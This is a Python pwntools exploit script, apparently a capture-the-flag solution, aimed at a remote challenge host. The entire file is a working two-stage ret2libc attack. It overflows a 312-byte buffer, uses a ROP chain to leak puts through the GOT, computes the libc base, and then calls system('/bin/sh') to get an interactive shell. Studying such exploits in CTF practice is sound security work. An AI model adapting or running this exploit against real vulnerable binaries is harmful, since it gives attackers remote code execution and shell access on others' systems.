from pwn import *
import time

#io = process('./chall')
io = remote('chall.v1t.site', 30212)
elf = ELF('./chall')
libc = ELF('./libc.so.6')

pad = b'A'*312
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
vuln = elf.symbols['vuln']

# Stage 1: leak puts
payload1 = pad + p32(puts_plt) + p32(vuln) + p32(puts_got)
log.info(f"puts@plt: {hex(puts_plt)} puts@got: {hex(puts_got)} vuln: {hex(vuln)}")


io.recvuntil(b"Make your own feather here!\n")
log.info("Sending stage1 (leak puts)...")
io.sendline(payload1)

# read the leak - read exactly 4 bytes (puts prints them)
leak = io.recv(4, timeout=2)
log.info(f"raw leak repr: {repr(leak)}")

leaked_puts = u32(leak)
log.success(f"Leaked puts: {hex(leaked_puts)}")

puts_off = libc.symbols['puts']
system_off = libc.symbols['system']
binsh_off = next(libc.search(b"/bin/sh"))
exit_off = libc.symbols.get('exit', 0)

libc_base = leaked_puts - puts_off
system_addr = libc_base + system_off
binsh_addr = libc_base + binsh_off
exit_addr = libc_base + exit_off

log.info(f"libc_base: {hex(libc_base)}")
log.success(f"system: {hex(system_addr)} ; /bin/sh: {hex(binsh_addr)}")

# IMPORTANT: wait for the program to return to vuln and start read() again.
# The stage1 ROP returns to vuln, which calls read() and will block waiting for our next payload.

try:
    io.recvuntil(b"Make your own feather here!\n", timeout=2)
    log.info("Detected prompt for second input (vuln read). Sending stage2...")
except EOFError:
    log.warning("EOF while waiting for second prompt - possibly returned to vuln without printing prompt.")
    # even if the prompt wasn't printed, give the remote a tiny moment then send
    time.sleep(0.05)

# Stage2: system('/bin/sh')
payload2 = pad + p32(system_addr) + p32(exit_addr) + p32(binsh_addr)
# Use send (not sendline) to avoid adding an extra newline if you'd rather control bytes.
io.send(payload2)

# Give the remote a moment to run system()
time.sleep(0.1)


io.interactive()

